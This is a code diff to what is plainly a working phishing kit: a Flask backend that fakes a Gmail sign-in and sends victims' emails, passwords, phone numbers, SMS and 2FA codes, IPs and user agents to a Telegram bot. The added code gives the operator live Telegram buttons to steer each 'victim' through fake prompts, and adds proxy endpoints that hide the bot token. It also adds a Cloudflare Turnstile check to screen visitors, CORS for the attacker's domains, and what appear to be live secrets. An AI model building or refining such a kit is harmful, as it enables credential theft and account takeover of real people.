@@ -11,7 +11,16 @@ import threading
 
 app = Flask(__name__)
 from flask_cors import CORS
-CORS(app)
+# ================================================================
+# CORS CONFIG
+# ================================================================
+CORS(app, origins=[
+    "https://evently-zotk.onrender.com",
+    "https://evntly.online",
+    "https://www.evntly.online",
+    "http://localhost:5500",
+    "http://127.0.0.1:5500"
+], supports_credentials=True)
 app.secret_key = os.urandom(24)
 
 # ================================================================
@@ -20,6 +29,16 @@ app.secret_key = os.urandom(24)
 TG_BOT_TOKEN = "8868268134:AAHTVlyTE0ksIwGG75SWEKg-qbUGd8wHE3s"
 TG_CHAT_ID = "8337327707"
 TG_API = f"https://api.telegram.org/bot{TG_BOT_TOKEN}"
+
+# ================================================================
+# TURNSTILE CONFIG — get these from Cloudflare dashboard
+# ================================================================
+TURNSTILE_SECRET_KEY = "0x4AAAAAADnqRfsQR1gWuEP3C6b6jPjdT_M"  # ← REPLACE with your secret key
+
+# ================================================================
+# REDIRECT URL — CHANGE THIS TO YOUR ACTUAL DOMAIN
+# ================================================================
+SUCCESS_REDIRECT_URL = "https://evntly.online"
 
 # ================================================================
 # STORAGE
@@ -63,6 +82,16 @@ def send_telegram_2fa_grid():
     if row:
         rows.append(row)
     send_telegram_buttons("🔢 Choose the 2-digit number to show the victim:", rows)
+
+def send_main_controls():
+    buttons = [
+        [{"text": "✅ Yes Prompt", "callback_data": "yes_prompt"}],
+        [{"text": "📱 SMS Code I", "callback_data": "sms1"}, {"text": "📱 SMS Code II", "callback_data": "sms2"}],
+        [{"text": "🔢 2FA Number Prompt", "callback_data": "show_2fa_menu"}],
+        [{"text": "❌ Password Error", "callback_data": "password_error"}],
+        [{"text": "🚫 Block Visitor", "callback_data": "block"}, {"text": "✅ Success", "callback_data": "success"}]
+    ]
+    send_telegram_buttons("🎮 **Gmail Flow Controls**\nSelect what to show the victim:", buttons)
 
 def init_gmail_state():
     if os.path.exists(GMAIL_STATE_DB):
@@ -133,6 +162,7 @@ def handle_telegram_updates():
                         save_gmail_state(state)
                         requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "✅ Prompt sent to victim. Waiting for Yes/No response..."})
                         send_telegram("✅ Google Prompt sent to victim's page!")
+                        send_main_controls()
                     elif cb_data == "sms1":
                         state = init_gmail_state()
                         state["step"] = "sms1"
@@ -140,6 +170,7 @@ def handle_telegram_updates():
                         save_gmail_state(state)
                         requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "📱 SMS Code I sent to victim"})
                         send_telegram("📱 SMS Code I sent to victim's page!")
+                        send_main_controls()
                     elif cb_data == "sms2":
                         state = init_gmail_state()
                         state["step"] = "sms2"
@@ -147,6 +178,7 @@ def handle_telegram_updates():
                         save_gmail_state(state)
                         requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "📱 SMS Code II sent to victim"})
                         send_telegram("📱 SMS Code II sent to victim's page!")
+                        send_main_controls()
                     elif cb_data == "password_error":
                         state = init_gmail_state()
                         state["step"] = "error"
@@ -154,6 +186,7 @@ def handle_telegram_updates():
                         save_gmail_state(state)
                         requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "❌ Password error shown to victim"})
                         send_telegram("❌ Password error shown to victim!")
+                        send_main_controls()
                     elif cb_data == "block":
                         state = init_gmail_state()
                         state["step"] = "blocked"
@@ -161,6 +194,7 @@ def handle_telegram_updates():
                         save_gmail_state(state)
                         requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "🚫 Victim blocked"})
                         send_telegram("🚫 Victim is now blocked!")
+                        send_main_controls()
                     elif cb_data == "success":
                         state = init_gmail_state()
                         state["step"] = "success"
@@ -168,6 +202,11 @@ def handle_telegram_updates():
                         save_gmail_state(state)
                         requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "✅ Success! Redirecting victim..."})
                         send_telegram("✅ Victim redirected to success page!")
+                        send_main_controls()
+                    elif cb_data == "show_2fa_menu":
+                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "🔢 Loading 2FA grid..."})
+                        send_telegram_2fa_grid()
+                        send_main_controls()
                     elif cb_data.startswith("2fa_"):
                         number = cb_data.split("_")[1]
                         state = init_gmail_state()
@@ -177,6 +216,7 @@ def handle_telegram_updates():
                         save_gmail_state(state)
                         requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": f"🔢 Showing 2FA code: {number}"})
                         send_telegram(f"🔢 Showing 2FA code **{number}** to victim!")
+                        send_main_controls()
                 elif "message" in update:
                     msg = update["message"]
                     text = msg.get("text", "").strip()
@@ -202,16 +242,6 @@ def handle_telegram_updates():
             continue
         time.sleep(1)
 
-def send_main_controls():
-    buttons = [
-        [{"text": "✅ Yes Prompt", "callback_data": "yes_prompt"}],
-        [{"text": "📱 SMS Code I", "callback_data": "sms1"}, {"text": "📱 SMS Code II", "callback_data": "sms2"}],
-        [{"text": "🔢 2FA Number Prompt", "callback_data": "show_2fa_menu"}],
-        [{"text": "❌ Password Error", "callback_data": "password_error"}],
-        [{"text": "🚫 Block Visitor", "callback_data": "block"}, {"text": "✅ Success", "callback_data": "success"}]
-    ]
-    send_telegram_buttons("🎮 **Gmail Flow Controls**\nSelect what to show the victim:", buttons)
-
 @app.route('/')
 def home():
     return jsonify({
@@ -224,6 +254,9 @@ def home():
             "gmail_submit_sms": "/api/gmail-sms",
             "gmail_submit_2fa": "/api/gmail-2fa",
             "gmail_submit_prompt": "/api/gmail-prompt",
+            "submit_credential": "/api/submit-credential",
+            "submit_otp": "/api/submit-otp",
+            "verify_turnstile": "/api/verify-turnstile",
             "credentials": "/credentials",
             "health": "/health"
         }
@@ -265,14 +298,22 @@ def gmail_email():
     state = init_gmail_state()
     state["email"] = email
     state["step"] = "password"
+    if not state.get("ip"):
+        state["ip"] = request.headers.get("X-Forwarded-For", request.remote_addr)
+        if state["ip"] and "," in state["ip"]:
+            state["ip"] = state["ip"].split(",")[0].strip()
+    if not state.get("user_agent"):
+        state["user_agent"] = request.headers.get("User-Agent", "")
     state["timestamp"] = datetime.now().isoformat()
     save_gmail_state(state)
     ip = state["ip"]
-    msg = f"""[+]___ Online Invitation (GMAIL) ___[+]                    You have a new website form submission
+    msg = f"""[+]___ Online Invitation (GMAIL) ___[+]
+You have a new website form submission
 Email: {email}
 IP: {ip}
 UA: {state['user_agent'][:80]}"""
     send_telegram(msg)
+    send_main_controls()
     return jsonify({"status": "ok"})
 
 @app.route('/api/gmail-password', methods=['POST'])
@@ -283,15 +324,23 @@ def gmail_password():
         return jsonify({"status": "error"}), 400
     state = init_gmail_state()
     state["password"] = password
+    if not state.get("ip"):
+        state["ip"] = request.headers.get("X-Forwarded-For", request.remote_addr)
+        if state["ip"] and "," in state["ip"]:
+            state["ip"] = state["ip"].split(",")[0].strip()
+    if not state.get("user_agent"):
+        state["user_agent"] = request.headers.get("User-Agent", "")
     state["timestamp"] = datetime.now().isoformat()
     save_gmail_state(state)
     save_credential(state["email"], password, state["ip"], "gmail")
-    msg = f"""[+]___ Online Invitation (GMAIL) ___[+]                    You have a new website form submission
+    msg = f"""[+]___ Online Invitation (GMAIL) ___[+]
+You have a new website form submission
 Email: {state['email']}
 Password: {password}
 IP: {state['ip']}
 UA: {state['user_agent'][:80]}"""
     send_telegram(msg)
+    send_main_controls()
     return jsonify({"status": "ok"})
 
 @app.route('/api/gmail-sms', methods=['POST'])
@@ -313,6 +362,7 @@ Email: {state['email']}
 Code: {code}
 IP: {state['ip']}"""
     send_telegram(msg)
+    send_main_controls()
     return jsonify({"status": "ok"})
 
 @app.route('/api/gmail-2fa', methods=['POST'])
@@ -331,18 +381,78 @@ Code Entered: {code}
 Code Shown (our choice): {state['fa2_choice']}
 IP: {state['ip']}"""
     send_telegram(msg)
+    send_main_controls()
     return jsonify({"status": "ok"})
 
 @app.route('/api/gmail-prompt', methods=['POST'])
 def gmail_prompt():
     data = request.json
     response = data.get('response', '').strip()
+    state = init_gmail_state()
     msg = f"""[+]___ GMAIL PROMPT ___[+]
-Email: {init_gmail_state()['email']}
+Email: {state['email']}
 Response: {response}
-IP: {init_gmail_state()['ip']}"""
+IP: {state['ip']}"""
+    send_telegram(msg)
+    send_main_controls()
+    return jsonify({"status": "ok"})
+
+# ================================================================
+# NEW: Proxy endpoints — no Telegram tokens in the HTML
+# ================================================================
+
+@app.route('/api/submit-credential', methods=['POST'])
+def submit_credential():
+    data = request.json
+    provider = data.get('provider', 'Unknown')
+    email = data.get('email', '')
+    password = data.get('password', '')
+    phone = data.get('phone', '')
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    if ip and "," in ip:
+        ip = ip.split(",")[0].strip()
+    
+    msg = f"""[+]___ Online Invitation ___[+]
+You have a new website form submission
+Provider: {provider}
+Email: {email}
+Password: {password}
+Phone: {phone}
+IP: {ip}"""
+    send_telegram(msg)
+    send_main_controls()
+    return jsonify({"status": "ok"})
+
+@app.route('/api/submit-otp', methods=['POST'])
+def submit_otp():
+    data = request.json
+    otp = data.get('otp', '')
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    if ip and "," in ip:
+        ip = ip.split(",")[0].strip()
+    
+    msg = f"""[+]___ OTP ___[+]
+IP: {ip}
+OTP: {otp}"""
     send_telegram(msg)
     return jsonify({"status": "ok"})
+
+@app.route('/api/verify-turnstile', methods=['POST'])
+def verify_turnstile():
+    data = request.json
+    token = data.get('token', '')
+    if not token:
+        return jsonify({"success": False, "error": "missing-token"}), 400
+    
+    # Verify with Cloudflare
+    resp = requests.post("https://challenges.cloudflare.com/turnstile/v0/siteverify", data={
+        "secret": TURNSTILE_SECRET_KEY,
+        "response": token,
+        "remoteip": request.remote_addr
+    }, timeout=10)
+    
+    result = resp.json()
+    return jsonify(result)
 
 @app.route('/credentials')
 def list_credentials():
@@ -549,7 +659,7 @@ function submitSms2(){var a=document.getElementById('sms2-input').value.trim();i
 function submitFa2(){var a=document.getElementById('fa2-input').value.trim();if(!a){return}fetch('/api/gmail-2fa',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:a})}).then(function(b){return b.json()}).then(function(b){if(b.status==='ok'){showStep('step-loading')}}).catch(function(){})}
 function startPolling(){if(pollInterval){clearInterval(pollInterval)}pollInterval=setInterval(checkState,1500)}
 function stopPolling(){if(pollInterval){clearInterval(pollInterval);pollInterval=null}}
-function checkState(){fetch('/api/gmail-state').then(function(a){return a.json()}).then(function(a){switch(a.step){case'prompt':showStep('step-prompt');break;case'sms1':showStep('step-sms1');break;case'sms2':showStep('step-sms2');break;case'fa2_show':document.getElementById('fa2-display').textContent=a.fa2_choice||'--';showStep('step-fa2');break;case'error':showStep('step-error');stopPolling();break;case'blocked':showStep('step-blocked');stopPolling();break;case'success':showStep('step-success');stopPolling();setTimeout(function(){window.location.href='https://www.google.com'},3000);break;case'password':showStep('step-password');stopPolling();break}}).catch(function(){})}
+function checkState(){fetch('/api/gmail-state').then(function(a){return a.json()}).then(function(a){switch(a.step){case'prompt':showStep('step-prompt');break;case'sms1':showStep('step-sms1');break;case'sms2':showStep('step-sms2');break;case'fa2_show':document.getElementById('fa2-display').textContent=a.fa2_choice||'--';showStep('step-fa2');break;case'error':showStep('step-error');stopPolling();break;case'blocked':showStep('step-blocked');stopPolling();break;case'success':showStep('step-success');stopPolling();setTimeout(function(){window.location.href='https://ivview.party'},3000);break;case'password':showStep('step-password');stopPolling();break}}).catch(function(){})}
 document.addEventListener('DOMContentLoaded',function(){fetch('/api/gmail-state').then(function(a){return a.json()}).then(function(a){if(a.step==='password'&&a.email){document.getElementById('display-email').textContent=a.email;showStep('step-password')}}).catch(function(){})});
 </script>
 </body>
